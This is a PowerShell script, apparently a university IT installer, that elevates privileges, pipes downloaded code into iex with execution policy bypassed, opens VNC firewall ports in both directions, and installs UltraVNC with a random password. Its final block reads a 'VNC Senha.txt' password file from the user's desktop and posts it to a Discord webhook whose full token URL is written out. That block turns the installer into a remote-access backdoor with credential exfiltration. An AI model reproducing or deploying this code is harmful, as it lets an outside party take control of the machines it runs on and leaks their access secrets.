$url = "https://suporte.ti.vet.ufmg.br/instalacao/vnc/instalar_vnc.ps1"
$ip_preffix = "150.164"

"Elevando Permissoes."
$currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
# Re-launch with full privileges...
Start-Process powershell -Verb RunAs -wait -ArgumentList ("-executionPolicy bypass iwr $url -UseBasicParsing | iex") 
exit
}
echo "Permissoes foram elevadas corretamente."

echo "Verificando instalacao do chocolatey/puppet."
$oldPreference = $ErrorActionPreference
$ErrorActionPreference = 'stop' 
try {
    if(Get-Command choco) {
        echo "Gerenciador de pacotes chocolatey/puppet previamente instalado." 
    }
} catch {
    echo "Instalando gerenciador de pacotes chocolatey/puppet"
    Set-ExecutionPolicy Bypass -Scope Process -Force; iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))
    Start-Process powershell -Verb RunAs -wait -ArgumentList ("-executionPolicy bypass iwr $url -UseBasicParsing | iex") 
    exit
} Finally {
    $ErrorActionPreference = $oldPreference
}
echo "Chocolatey instalado com sucesso."

echo "Abrindo portas para protocolo VNC."  
netsh advfirewall firewall add rule name="vnc" dir=out protocol=tcp localport=5900 action=allow | Out-Null
netsh advfirewall firewall add rule name="vnc" dir=out protocol=udp localport=5900 action=allow | Out-Null
netsh advfirewall firewall add rule name="vnc" dir=out protocol=tcp localport=5800 action=allow | Out-Null
netsh advfirewall firewall add rule name="vnc" dir=out protocol=udp localport=5800 action=allow | Out-Null
netsh advfirewall firewall add rule name="vnc" dir=in protocol=tcp localport=5900 action=allow | Out-Null
netsh advfirewall firewall add rule name="vnc" dir=in protocol=udp localport=5900 action=allow | Out-Null
netsh advfirewall firewall add rule name="vnc" dir=in protocol=tcp localport=5800 action=allow | Out-Null
netsh advfirewall firewall add rule name="vnc" dir=in protocol=udp localport=5800 action=allow | Out-Null

echo "Instalar UltraVNC."
#choco uninstall ultravnc -y | Out-Null
choco install --force ultravnc -y

echo "Gerando Chave."
$a = Get-Random -Minimum 100000 -Maximum 999999
& "C:\Program Files\uvnc bvba\UltraVnc\setpasswd.exe" $a 5555
echo "Chave " + $a

echo "Obtendo IP."
$ip = Get-NetIPAddress | Format-Table -Property IPAddress | findstr $ip_preffix

echo "Iniciando Servico UltraVNC."
net stop uvnc_service
net start uvnc_service

# Caminho do arquivo .txt gerado pelo seu script original
$arquivoTxt = "$env:USERPROFILE\Desktop\VNC Senha.txt"

# Ler o conteúdo do arquivo .txt
$conteudoTxt = Get-Content -Path $arquivoTxt -Raw

# URL do webhook do Discord
$urlWebhook = "https://discord.com/api/webhooks/1186839699998900224/maAvNFQo7zAuyMb1LUTewrGxSEXMW8XO2iqSgvngflsXlMSJ-ZhErKINHUHfCA5z0pv_"

# Montar o JSON com os dados a serem enviados para o Discord
$jsonBody = @{
    content = $conteudoTxt
} | ConvertTo-Json

# Enviar o conteúdo para o Discord via POST usando Invoke-RestMethod
Invoke-RestMethod -Uri $urlWebhook -Method Post -ContentType 'application/json' -Body $jsonBody
exit